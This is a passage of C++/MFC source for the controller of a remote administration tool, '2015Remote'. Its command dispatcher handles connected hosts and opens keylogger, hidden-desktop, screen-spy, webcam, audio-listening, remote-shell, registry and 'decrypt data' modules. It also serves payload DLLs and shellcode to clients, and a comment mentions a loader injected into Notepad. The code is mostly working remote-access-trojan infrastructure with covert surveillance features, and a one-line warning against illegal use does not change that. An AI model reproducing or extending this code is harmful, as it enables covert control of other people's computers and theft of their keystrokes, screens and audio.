	SendSelectedCommand(&bToken, sizeof(BYTE));
}

VOID CMy2015RemoteDlg::OnOnlineRegisterManager()
{
	BYTE	bToken = COMMAND_REGEDIT;         
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

VOID CMy2015RemoteDlg::OnOnlineKeyboardManager()
{
	BYTE	bToken = COMMAND_KEYBOARD;
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

std::vector<std::string> splitString(const std::string& str, char delimiter) {
	std::vector<std::string> result;
	std::stringstream ss(str);
	std::string item;

	while (std::getline(ss, item, delimiter)) {
		result.push_back(item);
	}
	return result;
}

std::string joinString(const std::vector<std::string>& tokens, char delimiter) {
	std::ostringstream oss;

	for (size_t i = 0; i < tokens.size(); ++i) {
		oss << tokens[i];
		if (i != tokens.size() - 1) {  // 在最后一个元素后不添加分隔符
			oss << delimiter;
		}
	}

	return oss.str();
}


bool CMy2015RemoteDlg::CheckValid(int trail) {
	DateVerify verify;
	BOOL isTrail = verify.isTrail(trail);

	if (!isTrail) {
		const Validation *verify = GetValidation();
		std::string masterHash = GetMasterHash();
		if (masterHash != GetPwdHash() && !verify->IsValid()) {
			return false;
		}

		auto settings = "settings", pwdKey = "Password";
		// 验证口令
		CPasswordDlg dlg(this);
		static std::string hardwareID = getHardwareID();
		static std::string hashedID = hashSHA256(hardwareID);
		static std::string deviceID = getFixedLengthID(hashedID);
		CString pwd = THIS_CFG.GetStr(settings, pwdKey, "").c_str();

		dlg.m_sDeviceID = deviceID.c_str();
		dlg.m_sPassword = pwd;
		if (pwd.IsEmpty() && IDOK != dlg.DoModal() || dlg.m_sPassword.IsEmpty()) {
			return false;
		}

		// 密码形式：20250209 - 20350209: SHA256: HostNum
		auto v = splitString(dlg.m_sPassword.GetBuffer(), '-');
		if (v.size() != 6 && v.size() != 7)
		{
			THIS_CFG.SetStr(settings, pwdKey, "");
			MessageBox("格式错误，请重新申请口令!", "提示", MB_ICONINFORMATION);
			return false;
		}
		std::vector<std::string> subvector(v.end() - 4, v.end());
		std::string password = v[0] + " - " + v[1] + ": " + GetPwdHash() + (v.size()==6?"":": "+v[2]);
		std::string finalKey = deriveKey(password, deviceID);
		std::string hash256 = joinString(subvector, '-');
		std::string fixedKey = getFixedLengthID(finalKey);
		if (hash256 != fixedKey) {
			THIS_CFG.SetStr(settings, pwdKey, "");
			if (pwd.IsEmpty() || hash256 != fixedKey || IDOK != dlg.DoModal()) {
				if (!dlg.m_sPassword.IsEmpty())
					MessageBox("口令错误, 无法继续操作!", "提示", MB_ICONWARNING);
				return false;
			}
		}
		// 判断是否过期
		auto pekingTime = ToPekingTime(nullptr);
		char curDate[9];
		std::strftime(curDate, sizeof(curDate), "%Y%m%d", &pekingTime);
		if (curDate < v[0] || curDate > v[1]) {
			THIS_CFG.SetStr(settings, pwdKey, "");
			MessageBox("口令过期，请重新申请口令!", "提示", MB_ICONINFORMATION);
			return false;
		}
		if (dlg.m_sPassword != pwd)
			THIS_CFG.SetStr(settings, pwdKey, dlg.m_sPassword.GetString());
		
		int maxConn = v.size() == 7 ? atoi(v[2].c_str()) : 2;
		if (maxConn != m_nMaxConnection) {
			m_nMaxConnection = maxConn;
			THIS_APP->UpdateMaxConnection(m_nMaxConnection);
		}
	}
	return true;
}

void CMy2015RemoteDlg::OnOnlineBuildClient()
{
	// TODO: 在此添加命令处理程序代码
	CBuildDlg Dlg;
	Dlg.m_strIP = THIS_CFG.GetStr("settings", "master", "").c_str();
	int Port = THIS_CFG.Get1Int("settings", "ghost", ';', 6543);
	Dlg.m_strIP = Dlg.m_strIP.IsEmpty() ? "127.0.0.1" : Dlg.m_strIP;
	Dlg.m_strPort = Port <= 0 ? "6543" : std::to_string(Port).c_str();
	Dlg.DoModal();
}


VOID CMy2015RemoteDlg::SendSelectedCommand(PBYTE  szBuffer, ULONG ulLength)
{
	EnterCriticalSection(&m_cs);
	POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
	while(Pos)
	{
		int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
		context* ContextObject = (context*)m_CList_Online.GetItemData(iItem);
		if (!ContextObject->IsLogin() && szBuffer[0] != COMMAND_BYE)
			continue;
		if (szBuffer[0] == COMMAND_UPDATE) {
			CString data = ContextObject->GetClientData(ONLINELIST_CLIENTTYPE);
			if (data == "SC" || data == "MDLL") {
				ContextObject->Send2Client(szBuffer, 1);
				continue;
			}
		}
		ContextObject->Send2Client(szBuffer, ulLength);
	} 
	LeaveCriticalSection(&m_cs);
}

//真彩Bar
VOID CMy2015RemoteDlg::OnAbout()
{
	MessageBox("Copyleft (c) FTU 2019—2025" + CString("\n编译日期: ") + __DATE__ + 
		CString(sizeof(void*)==8 ? " (x64)" : " (x86)"), "关于");
}

//托盘Menu
void CMy2015RemoteDlg::OnNotifyShow()
{
	BOOL v=	IsWindowVisible();
	ShowWindow(v? SW_HIDE : SW_SHOW);
}


void CMy2015RemoteDlg::OnNotifyExit()
{
	Release();
	CDialogEx::OnOK(); // 关闭对话框
}


//固态菜单
void CMy2015RemoteDlg::OnMainSet()
{
	CSettingDlg  Dlg;
	Dlg.m_nMax_Connect = m_nMaxConnection;
	BOOL use = THIS_CFG.GetInt("frp", "UseFrp");
	int port = THIS_CFG.GetInt("frp", "server_port", 7000);
	auto token = THIS_CFG.GetStr("frp", "token");
	auto ret = Dlg.DoModal();   //模态 阻塞
	if (ret != IDOK) return;

	BOOL use_new = THIS_CFG.GetInt("frp", "UseFrp");
	int port_new = THIS_CFG.GetInt("frp", "server_port", 7000);
	auto token_new = THIS_CFG.GetStr("frp", "token");
	ApplyFrpSettings();
	if (use_new != use) {
		MessageBoxA("修改FRP代理开关，需要重启当前应用程序方可生效。", "提示", MB_ICONINFORMATION);
	} else if (port != port_new || token != token_new) {
		m_frpStatus = STATUS_STOP;
		Sleep(200);
		m_frpStatus = STATUS_RUN;
	}
	if (use && use_new && m_hFRPThread == NULL) {
		MessageBoxA("FRP代理服务异常，需要重启当前应用程序进行重试。", "提示", MB_ICONINFORMATION);
	}
	int m = atoi(THIS_CFG.GetStr("settings", "ReportInterval", "5").c_str());
	int n = THIS_CFG.GetInt("settings", "SoftwareDetect");
	if (m== m_settings.ReportInterval && n == m_settings.DetectSoftware) {
		return;
	}

	LVCOLUMN lvColumn;
	memset(&lvColumn, 0, sizeof(LVCOLUMN));
	lvColumn.mask = LVCF_TEXT;
	lvColumn.pszText = Dlg.m_sSoftwareDetect.GetBuffer();
	CLock L(m_cs);
	m_settings.ReportInterval = m;
	m_settings.DetectSoftware = n;
	m_CList_Online.SetColumn(ONLINELIST_VIDEO, &lvColumn);
	SendMasterSettings(nullptr);
}


void CMy2015RemoteDlg::OnMainExit()
{
	Release();
	CDialogEx::OnOK(); // 关闭对话框
}

std::string exec(const std::string& cmd) {
	HANDLE hReadPipe, hWritePipe;
	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

	if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
		return "";
	}

	STARTUPINFOA si = {};
	PROCESS_INFORMATION pi = {};
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.hStdOutput = hWritePipe;
	si.hStdError = hWritePipe;
	si.wShowWindow = SW_HIDE;

	std::string command = "cmd.exe /C " + cmd;

	if (!CreateProcessA(
		NULL,
		(char*)command.data(),
		NULL,
		NULL,
		TRUE,
		CREATE_NO_WINDOW,
		NULL,
		NULL,
		&si,
		&pi
	)) {
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);
		return "";
	}

	CloseHandle(hWritePipe);

	char buffer[256];
	std::string result;
	DWORD bytesRead;

	while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
		buffer[bytesRead] = '\0';
		result += buffer;
	}

	CloseHandle(hReadPipe);
	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	return result;
}

std::vector<std::string> splitByNewline(const std::string& input) {
	std::vector<std::string> lines;
	std::istringstream stream(input);
	std::string line;

	while (std::getline(stream, line)) {
		lines.push_back(line);
	}

	return lines;
}

BOOL CMy2015RemoteDlg::Activate(const std::string& nPort,int nMaxConnection, const std::string& method)
{
	AUTO_TICK(200);
	UINT ret = 0;
	if ( (ret = THIS_APP->StartServer(NotifyProc, OfflineProc, nPort, nMaxConnection, method)) !=0 )
	{
		Mprintf("======> StartServer Failed \n");
		char cmd[200];
		sprintf_s(cmd, "for /f \"tokens=5\" %%i in ('netstat -ano ^| findstr \":%s \"') do @echo %%i", nPort.c_str());
		std::string output = exec(cmd);
		output.erase(std::remove(output.begin(), output.end(), '\r'), output.end());
		if (!output.empty())
		{
			std::vector<std::string> lines = splitByNewline(output);
			std::sort(lines.begin(), lines.end());
			auto last = std::unique(lines.begin(), lines.end());
			lines.erase(last, lines.end());

			std::string pids;
			for (const auto& line : lines) {
				pids += line + ",";
			}
			if (!pids.empty()) {
				pids.back() = '?';
			}
			if (IDYES == MessageBox("调用函数StartServer失败! 错误代码:" + CString(std::to_string(ret).c_str()) +
				"\r\n是否关闭以下进程重试: " + pids.c_str(), "提示", MB_YESNO)) {
				for (const auto& line : lines) {
					auto cmd = std::string("taskkill /f /pid ") + line;
					exec(cmd.c_str());
				}
				return Activate(nPort, nMaxConnection, method);
			}
		}else
			MessageBox("调用函数StartServer失败! 错误代码:" + CString(std::to_string(ret).c_str()));
		return FALSE;
	}

	ShowMessage("使用提示", "严禁用于非法侵入、控制、监听他人设备等违法行为");
	CString strTemp;
	strTemp.Format("监听端口: %s成功", nPort.c_str());
	ShowMessage("操作成功",strTemp);
	return TRUE;
}


BOOL CALLBACK CMy2015RemoteDlg::NotifyProc(CONTEXT_OBJECT* ContextObject)
{
	if (!g_2015RemoteDlg || g_2015RemoteDlg->isClosed) {
		return FALSE;
	}

	AUTO_TICK(50);

	if (ContextObject->hWnd) {
		if (!IsWindow(ContextObject->hWnd))
			return FALSE;
		DialogBase* Dlg = (DialogBase*)ContextObject->hDlg;
		Dlg->MarkReceiving(true);
		Dlg->OnReceiveComplete();
		Dlg->MarkReceiving(false);
	} else {
		HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
		if (hEvent == NULL) {
			Mprintf("===> NotifyProc CreateEvent FAILED: %p <===\n", ContextObject);
			return FALSE;
		}
		if (!g_2015RemoteDlg->PostMessage(WM_HANDLEMESSAGE, (WPARAM)hEvent, (LPARAM)ContextObject)) {
			Mprintf("===> NotifyProc PostMessage FAILED: %p <===\n", ContextObject);
			CloseHandle(hEvent);
			return FALSE;
		}
		HANDLE handles[2] = { hEvent, g_2015RemoteDlg->m_hExit };
		DWORD result = WaitForMultipleObjects(2, handles, FALSE, INFINITE);
		if (result == WAIT_FAILED) {
			DWORD err = GetLastError();
			Mprintf("NotifyProc WaitForMultipleObjects failed, error=%lu\n", err);
		}
	}
	return TRUE;
}

// 对话框指针及对话框句柄
struct dlgInfo
{
	HANDLE hDlg;	// 对话框指针
	HWND hWnd;		// 窗口句柄
	dlgInfo(HANDLE h, HWND type) : hDlg(h), hWnd(type) { }
};

BOOL CALLBACK CMy2015RemoteDlg::OfflineProc(CONTEXT_OBJECT* ContextObject)
{
	if (!g_2015RemoteDlg || g_2015RemoteDlg->isClosed)
		return FALSE;
	dlgInfo* dlg = ContextObject->hWnd ? new dlgInfo(ContextObject->hDlg, ContextObject->hWnd) : NULL;

	SOCKET nSocket = ContextObject->sClientSocket;

	g_2015RemoteDlg->PostMessage(WM_USEROFFLINEMSG, (WPARAM)dlg, (LPARAM)nSocket);

	ContextObject->hWnd = NULL;

	return TRUE;
}


LRESULT CMy2015RemoteDlg::OnHandleMessage(WPARAM wParam, LPARAM lParam) {
	HANDLE hEvent = (HANDLE)wParam;
	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;
	MessageHandle(ContextObject);
	if (hEvent) {
		SetEvent(hEvent);
		CloseHandle(hEvent);
	}
	return S_OK;
}

std::string getDateStr(int daysOffset = 0) {
	// 获取当前时间点
	std::time_t now = std::time(nullptr);

	// 加上指定的天数（可以为负）
	now += static_cast<std::time_t>(daysOffset * 24 * 60 * 60);

	std::tm* t = std::localtime(&now);

	std::ostringstream oss;
	oss << std::setfill('0') << std::setw(4) << (t->tm_year + 1900)
		<< std::setw(2) << (t->tm_mon + 1)
		<< std::setw(2) << t->tm_mday;

	return oss.str();
}

VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject) 
{
	if (isClosed) {
		return;
	}
	clock_t tick = clock();
	unsigned cmd = ContextObject->InDeCompressedBuffer.GetBYTE(0);
	unsigned len = ContextObject->InDeCompressedBuffer.GetBufferLen();
	// 【L】：主机上下线和授权
	// 【x】：对话框相关功能
	switch (cmd)
	{
	case TOKEN_GETVERSION: // 获取版本【L】
	{
		// TODO 维持心跳
		bool is64Bit = ContextObject->InDeCompressedBuffer.GetBYTE(1);
		Buffer* bin = m_ServerBin[is64Bit ? PAYLOAD_DLL_X64 : PAYLOAD_DLL_X86];
		DllSendData dll = { TASK_MAIN, L"ServerDll.dll", is64Bit, bin->length()-6 };
		BYTE *resp = new BYTE[1 + sizeof(DllSendData) + dll.DataSize];
		resp[0] = 0;
		memcpy(resp+1, &dll, sizeof(DllSendData));
		memcpy(resp+1+sizeof(DllSendData), bin->c_str() + 6, dll.DataSize);
		ContextObject->Send2Client(resp, 1 + sizeof(DllSendData) + dll.DataSize);
		SAFE_DELETE_ARRAY(resp);
		break;
	}
	case CMD_AUTHORIZATION: // 获取授权【L】
	{
		int n = ContextObject->InDeCompressedBuffer.GetBufferLength();
		if (n < 100) break;
		char resp[100] = { 0 }, *devId = resp + 5, *pwdHash = resp + 32;
		ContextObject->InDeCompressedBuffer.CopyBuffer(resp, min(n, sizeof(resp)), 0);
		unsigned short* days = (unsigned short*)(resp + 1);
		unsigned short* num = (unsigned short*)(resp + 3);
		BYTE msg[12] = {};
		memcpy(msg, resp, 5);
		memcpy(msg+8, resp+96, 4);
		uint32_t now = clock();
		uint32_t tm = *(uint32_t*)(resp + 96);
		if (now < tm || now - tm > 30000) {
			Mprintf("Get authorization timeout[%s], devId: %s, pwdHash:%s", ContextObject->PeerName.c_str(),
				devId, pwdHash);
			break;
		}
		uint64_t signature = *(uint64_t*)(resp + 24);
		if (devId[0] == 0 || pwdHash[0] == 0 || !VerifyMessage(m_superPass, msg, sizeof(msg), signature)){
			Mprintf("Get authorization failed[%s], devId: %s, pwdHash:%s\n", ContextObject->PeerName.c_str(),
				devId, pwdHash);
			break;
		}
		char hostNum[10] = {};
		sprintf(hostNum, "%04d", *num);
		// 密码形式：20250209 - 20350209: SHA256: HostNum
		std::string hash = std::string(pwdHash, pwdHash+64);
		std::string password = getDateStr(0) + " - " + getDateStr(*days) + ": " + hash + ": " + hostNum;
		std::string finalKey = deriveKey(password, std::string(devId, devId+19));
		std::string fixedKey = getDateStr(0) + std::string("-") + getDateStr(*days) + "-" + hostNum + 
			std::string("-") + getFixedLengthID(finalKey);
		memcpy(devId, fixedKey.c_str(), fixedKey.length());
		devId[fixedKey.length()] = 0;
		std::string hmac = genHMAC(hash, m_superPass);
		memcpy(resp + 64, hmac.c_str(), hmac.length());
		resp[80] = 0;
		ContextObject->Send2Client((LPBYTE)resp, sizeof(resp));
		Sleep(20);
		break;
	}
	case CMD_EXECUTE_DLL: // 请求DLL（执行代码）【L】
	{
		DllExecuteInfo *info = (DllExecuteInfo*)ContextObject->InDeCompressedBuffer.GetBuffer(1);
		for (std::vector<DllInfo*>::const_iterator i=m_DllList.begin(); i!=m_DllList.end(); ++i){
			DllInfo* dll = *i;
			if (dll->Name == info->Name) {
				// TODO 如果是UDP，发送大包数据基本上不可能成功
				ContextObject->Send2Client( dll->Data->Buf(), dll->Data->length());
				break;
			}
		}
		Sleep(20);
		break;
	}
	case COMMAND_PROXY:// 代理映射【x】
	{
		g_2015RemoteDlg->SendMessage(WM_OPENPROXYDIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case TOKEN_HEARTBEAT: case 137: // 心跳【L】
		UpdateActiveWindow(ContextObject);
		break;
	case SOCKET_DLLLOADER: {// 请求DLL【L】
		auto len = ContextObject->InDeCompressedBuffer.GetBufferLength();
		bool is64Bit = len > 1 ? ContextObject->InDeCompressedBuffer.GetBYTE(1) : false;
		int typ = (len > 2 ? ContextObject->InDeCompressedBuffer.GetBYTE(2) : MEMORYDLL);
		bool isRelease = len > 3 ? ContextObject->InDeCompressedBuffer.GetBYTE(3) : true;
		int connNum = 0;
		if (typ == SHELLCODE) {
			Mprintf("===> '%s' Request SC [is64Bit:%d isRelease:%d]\n", ContextObject->RemoteAddr().c_str(), is64Bit, isRelease);
		} else {
			Mprintf("===> '%s' Request DLL [is64Bit:%d isRelease:%d]\n", ContextObject->RemoteAddr().c_str(), is64Bit, isRelease);
		}
		char version[12] = {};
		ContextObject->InDeCompressedBuffer.CopyBuffer(version, 12, 4);
		// TODO 注入记事本的加载器需要更新
		SendServerDll(ContextObject, typ==MEMORYDLL, is64Bit);
		break;
	}
	case COMMAND_BYE: // 主机下线【L】
		{
			CancelIo((HANDLE)ContextObject->sClientSocket);
			closesocket(ContextObject->sClientSocket); 
			Sleep(10);
			break;
		}
	case TOKEN_DRAWING_BOARD:// 远程画板【x】
	{
		g_2015RemoteDlg->SendMessage(WM_OPENDRAWINGBOARD, 0, (LPARAM)ContextObject);
		break;
	}
	case TOKEN_DRIVE_LIST_PLUGIN: // 文件管理【x】
	{
		g_2015RemoteDlg->SendMessage(WM_OPENFILEMGRDIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case TOKEN_BITMAPINFO_HIDE: { // 虚拟桌面【x】
		g_2015RemoteDlg->SendMessage(WM_OPENHIDESCREENDLG, 0, (LPARAM)ContextObject);
		break;
	}
	case TOKEN_SYSINFOLIST: { // 主机管理【x】
		g_2015RemoteDlg->SendMessage(WM_OPENMACHINEMGRDLG, 0, (LPARAM)ContextObject);
		break;
	}
	case TOKEN_CHAT_START: { // 远程交谈【x】
		g_2015RemoteDlg->SendMessage(WM_OPENCHATDIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case TOKEN_DECRYPT: { // 解密数据【x】
		g_2015RemoteDlg->SendMessage(WM_OPENDECRYPTDIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case TOKEN_KEYBOARD_START: {// 键盘记录【x】
			g_2015RemoteDlg->SendMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
	case TOKEN_LOGIN: // 上线包【L】
		{
			g_2015RemoteDlg->SendMessage(WM_USERTOONLINELIST, 0, (LPARAM)ContextObject); 
			break;
		}
	case TOKEN_BITMAPINFO: // 远程桌面【x】
		{
			g_2015RemoteDlg->SendMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
	case TOKEN_DRIVE_LIST: // 文件管理【x】
		{
			g_2015RemoteDlg->SendMessage(WM_OPENFILEMANAGERDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
	case TOKEN_TALK_START: // 发送消息【x】
		{
			g_2015RemoteDlg->SendMessage(WM_OPENTALKDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
	case TOKEN_SHELL_START: // 远程终端【x】
		{
			g_2015RemoteDlg->SendMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
	case TOKEN_WSLIST:  // 窗口管理【x】
	case TOKEN_PSLIST:  // 进程管理【x】
		{
			g_2015RemoteDlg->SendMessage(WM_OPENSYSTEMDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
	case TOKEN_AUDIO_START: // 语音监听【x】
		{
			g_2015RemoteDlg->SendMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)ContextObject);
			break;
		}
	case TOKEN_REGEDIT: // 注册表管理【x】
		{                            
			g_2015RemoteDlg->SendMessage(WM_OPENREGISTERDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
	case TOKEN_SERVERLIST: // 服务管理【x】
		{
			g_2015RemoteDlg->SendMessage(WM_OPENSERVICESDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头【x】
		{
			g_2015RemoteDlg->SendMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
	case CMD_PADDING: { // 随机填充
		Mprintf("Receive padding command '%s' [%d]: Len=%d\n", ContextObject->PeerName.c_str(), cmd, len);
		break;
	}
	default: {
			Mprintf("Receive unknown command '%s' [%d]: Len=%d\n", ContextObject->PeerName.c_str(), cmd, len);
		}
	}
	auto duration = clock() - tick;
	if (duration > 200) {
		Mprintf("[%s] Command '%s' [%d] cost %d ms\n", __FUNCTION__, ContextObject->PeerName.c_str(), cmd, duration);
	}
}

LRESULT CMy2015RemoteDlg::OnUserToOnlineList(WPARAM wParam, LPARAM lParam)
{
	CString strIP,  strAddr,  strPCName, strOS, strCPU, strVideo, strPing;
	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam; //注意这里的  ClientContext  正是发送数据时从列表里取出的数据

	if (ContextObject == NULL || isClosed)
	{
		return -1;
	}

	try
	{
		strIP = ContextObject->GetPeerName().c_str();
		// 不合法的数据包
		if (ContextObject->InDeCompressedBuffer.GetBufferLength() != sizeof(LOGIN_INFOR))
		{
			char buf[100];
			sprintf_s(buf, "*** Received [%s] invalid login data! ***\n", strIP.GetString());
			Mprintf(buf);
			return -1;
		}

		LOGIN_INFOR* LoginInfor = new LOGIN_INFOR;
		ContextObject->InDeCompressedBuffer.CopyBuffer((LPBYTE)LoginInfor, sizeof(LOGIN_INFOR), 0);

		auto curID = GetMasterId();
		ContextObject->bLogin = (LoginInfor->szMasterID == curID || strlen(LoginInfor->szMasterID)==0);
		if (!ContextObject->bLogin) {
			Mprintf("*** Received master '%s' client! ***\n", LoginInfor->szMasterID);
		}

		//主机名称
		strPCName = LoginInfor->szPCName;

		//版本信息
		strOS = LoginInfor->OsVerInfoEx;

		//CPU
		if (LoginInfor->dwCPUMHz != -1)
		{
			strCPU.Format("%dMHz", LoginInfor->dwCPUMHz);
		}
		else {
			strCPU = "Unknown";
		}

		//网速
		strPing.Format("%d", LoginInfor->dwSpeed);

		strVideo = m_settings.DetectSoftware ? "无" : LoginInfor->bWebCamIsExist ? "有" : "无";

		strAddr.Format("%d", ContextObject->GetPort());
		auto v = LoginInfor->ParseReserved(RES_MAX);
		AddList(strIP,strAddr,strPCName,strOS,strCPU,strVideo,strPing,LoginInfor->moduleVersion,LoginInfor->szStartTime, v, ContextObject);
		delete LoginInfor;
		return S_OK;
	}catch(...){
		Mprintf("[ERROR] OnUserToOnlineList catch an error \n");
	}
	return -1;
}


LRESULT CMy2015RemoteDlg::OnUserOfflineMsg(WPARAM wParam, LPARAM lParam)
{
	Mprintf("======> OnUserOfflineMsg\n");
	CString ip, port;
	port.Format("%d", lParam);
	EnterCriticalSection(&m_cs);
	int n = m_CList_Online.GetItemCount();
	for (int i = 0; i < n; ++i)
	{
		CString cur = m_CList_Online.GetItemText(i, ONLINELIST_ADDR);
		if (cur == port)
		{
			ip = m_CList_Online.GetItemText(i, ONLINELIST_IP);
			m_CList_Online.DeleteItem(i);
			ShowMessage("操作成功", ip + "主机下线");
			break;
		}
	}
	LeaveCriticalSection(&m_cs);

	dlgInfo *p = (dlgInfo *)wParam;
	if (p)
	{
		if (::IsWindow(p->hWnd)) {
			::PostMessageA(p->hWnd, WM_CLOSE, 0, 0);
		}
		delete p;
		p = NULL;
	}

	return S_OK;
}

void CMy2015RemoteDlg::UpdateActiveWindow(CONTEXT_OBJECT* ctx) {
	Heartbeat hb;
	ctx->InDeCompressedBuffer.CopyBuffer(&hb, sizeof(Heartbeat), 1);

	// 回复心跳
	// if(0)
	{
		HeartbeatACK ack = { hb.Time };
		BYTE buf[sizeof(HeartbeatACK) + 1] = { CMD_HEARTBEAT_ACK};
		memcpy(buf + 1, &ack, sizeof(HeartbeatACK));
		ctx->Send2Client(buf, sizeof(buf));
	}

	CLock L(m_cs);
	int n = m_CList_Online.GetItemCount();
	context* cur = (context*)ctx;
	for (int i = 0; i < n; ++i) {
		context* id = (context*)m_CList_Online.GetItemData(i);
		if (cur->IsEqual(id)) {
			m_CList_Online.SetItemText(i, ONLINELIST_LOGINTIME, hb.ActiveWnd);
			if (hb.Ping > 0)
				m_CList_Online.SetItemText(i, ONLINELIST_PING, std::to_string(hb.Ping).c_str());
			m_CList_Online.SetItemText(i, ONLINELIST_VIDEO, hb.HasSoftware ? "有" : "无");
			return;
		}
	}
}


void CMy2015RemoteDlg::SendMasterSettings(CONTEXT_OBJECT* ctx) {
	BYTE buf[sizeof(MasterSettings) + 1] = { CMD_MASTERSETTING };
	memcpy(buf+1, &m_settings, sizeof(MasterSettings));

	if (ctx) {
		ctx->Send2Client(buf, sizeof(buf));
	}
	else {
		EnterCriticalSection(&m_cs);
		for (int i=0, n=m_CList_Online.GetItemCount(); i<n; ++i)
		{
			context* ContextObject = (context*)m_CList_Online.GetItemData(i);
			if (!ContextObject->IsLogin())
				continue;
			ContextObject->Send2Client(buf, sizeof(buf));
		}
		LeaveCriticalSection(&m_cs);
	}
}

VOID CMy2015RemoteDlg::SendServerDll(CONTEXT_OBJECT* ContextObject, bool isDLL, bool is64Bit) {
	auto id = is64Bit ? PAYLOAD_DLL_X64 : PAYLOAD_DLL_X86;
	auto buf = isDLL ? m_ServerDLL[id] : m_ServerBin[id];
	if (buf->length()) {
		// 只有发送了IV的加载器才支持AES加密
		int len = ContextObject->InDeCompressedBuffer.GetBufferLength();
		char md5[33] = {};
		memcpy(md5, (char*)ContextObject->InDeCompressedBuffer.GetBuffer(32), max(0,min(32, len-32)));
		if (!buf->MD5().empty() && md5 != buf->MD5())
			ContextObject->Send2Client( buf->Buf(), buf->length(len<=20));
		else {
			ContextObject->Send2Client( buf->Buf(), 6 /* data not changed */);
		}
	}
}


LRESULT CMy2015RemoteDlg::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
{
	return OpenDialog<CScreenSpyDlg, IDD_DIALOG_SCREEN_SPY, SW_SHOWMAXIMIZED>(wParam, lParam);
}

LRESULT CMy2015RemoteDlg::OnOpenFileManagerDialog(WPARAM wParam, LPARAM lParam)
{
	return OpenDialog<CFileManagerDlg, IDD_FILE>(wParam, lParam);
}

LRESULT CMy2015RemoteDlg::OnOpenTalkDialog(WPARAM wParam, LPARAM lParam)
{
	return OpenDialog<CTalkDlg, IDD_DIALOG_TALK>(wParam, lParam);
}

LRESULT CMy2015RemoteDlg::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
{
	return OpenDialog<CShellDlg, IDD_DIALOG_SHELL>(wParam, lParam);
}


LRESULT CMy2015RemoteDlg::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
{
	return OpenDialog<CSystemDlg, IDD_DIALOG_SYSTEM>(wParam, lParam);
}

LRESULT CMy2015RemoteDlg::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
{
	return OpenDialog<CAudioDlg, IDD_DIALOG_AUDIO>(wParam, lParam);
}

LRESULT CMy2015RemoteDlg::OnOpenServicesDialog(WPARAM wParam, LPARAM lParam)
{
	return OpenDialog<CServicesDlg, IDD_DIALOG_SERVICES>(wParam, lParam);
}

LRESULT CMy2015RemoteDlg::OnOpenRegisterDialog(WPARAM wParam, LPARAM lParam)
{
	return OpenDialog<CRegisterDlg, IDD_DIALOG_REGISTER>(wParam, lParam);
}

LRESULT CMy2015RemoteDlg::OnOpenVideoDialog(WPARAM wParam, LPARAM lParam)
{
	return OpenDialog<CVideoDlg, IDD_DIALOG_VIDEO>(wParam, lParam);
}

LRESULT CMy2015RemoteDlg::OnOpenKeyboardDialog(WPARAM wParam, LPARAM lParam)
{
	return OpenDialog<CKeyBoardDlg, IDD_DLG_KEYBOARD>(wParam, lParam);
}

LRESULT CMy2015RemoteDlg::OnOpenProxyDialog(WPARAM wParam, LPARAM lParam)
{
	return OpenDialog<CProxyMapDlg, IDD_PROXY>(wParam, lParam);
}

LRESULT CMy2015RemoteDlg::OnOpenHideScreenDialog(WPARAM wParam, LPARAM lParam)
{
	return OpenDialog<CHideScreenSpyDlg, IDD_SCREEN>(wParam, lParam);
}

LRESULT CMy2015RemoteDlg::OnOpenMachineManagerDialog(WPARAM wParam, LPARAM lParam)
{
	return OpenDialog<CMachineDlg, IDD_MACHINE>(wParam, lParam);
}

LRESULT CMy2015RemoteDlg::OnOpenChatDialog(WPARAM wParam, LPARAM lParam)
{
	return OpenDialog<CChat, IDD_CHAT>(wParam, lParam);
}

LRESULT CMy2015RemoteDlg::OnOpenDecryptDialog(WPARAM wParam, LPARAM lParam)
{
	return OpenDialog<DecryptDlg, IDD_DIALOG_DECRYPT>(wParam, lParam);
}

LRESULT CMy2015RemoteDlg::OnOpenFileMgrDialog(WPARAM wParam, LPARAM lParam)
{
	return OpenDialog<file::CFileManagerDlg, IDD_FILE_WINOS>(wParam, lParam);
}

LRESULT CMy2015RemoteDlg::OnOpenDrawingBoard(WPARAM wParam, LPARAM lParam)
{
	return OpenDialog<CDrawingBoard, IDD_DRAWING_BOARD>(wParam, lParam);
}

BOOL CMy2015RemoteDlg::OnHelpInfo(HELPINFO* pHelpInfo)
{
	OnAbout();
	return TRUE;
}


BOOL CMy2015RemoteDlg::PreTranslateMessage(MSG* pMsg)
{
	if (pMsg->message == WM_KEYDOWN && pMsg->wParam == VK_RETURN)
	{
		return TRUE;
	}

